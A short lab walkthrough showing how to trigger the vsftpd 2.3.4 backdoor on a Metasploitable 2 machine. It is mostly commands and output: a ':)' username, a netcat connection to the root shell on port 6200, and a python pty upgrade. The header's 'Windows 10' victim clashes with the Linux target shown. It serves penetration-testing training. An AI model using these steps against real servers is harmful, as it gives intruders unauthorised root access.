VSFTPD v2.3.4 Backdoor Command Execution
**Attacker:** Kali Linux<br>
**Victim:** Windows 10<br>
<br>
VSFTPD v2.3.4 contains a backdoor that is triggered by entering **anystring:)** as the username (no password required). After the backdoor is triggered, the target machine opens a shell on port 6200.<br>
<br>
This example demonstrates it’s use on Metasploitable 2 (192.168.1.142).
##Triggering the Backdoor
<code>
<div class="code">
root@kali:~$ <com>ftp 192.168.1.142</com><br>
Connected to 192.168.1.142.<br>
220 (vsFTPd 2.3.4)<br>
Name (192.168.1.142:root):<com>123456:)</com><br>
331 Please specify the password.<br>
Password: [Enter]<br>
[CTRL+C]<br>
421 Service not available, remote server has closed connection
</div>
</code>
##Connecting to the Shell
<code>
<div class="code">
root@kali:~$ <com>nc -vn 192.168.1.142 6200</com><br>
(UNKNOWN) [192.168.1.142] 6200 (?) open<br>
<com>python -c "import pty;pty.spawn('/bin/bash')"</com><br>
root@metasploitable:/#
</div>
</code>

Tags: backdoors
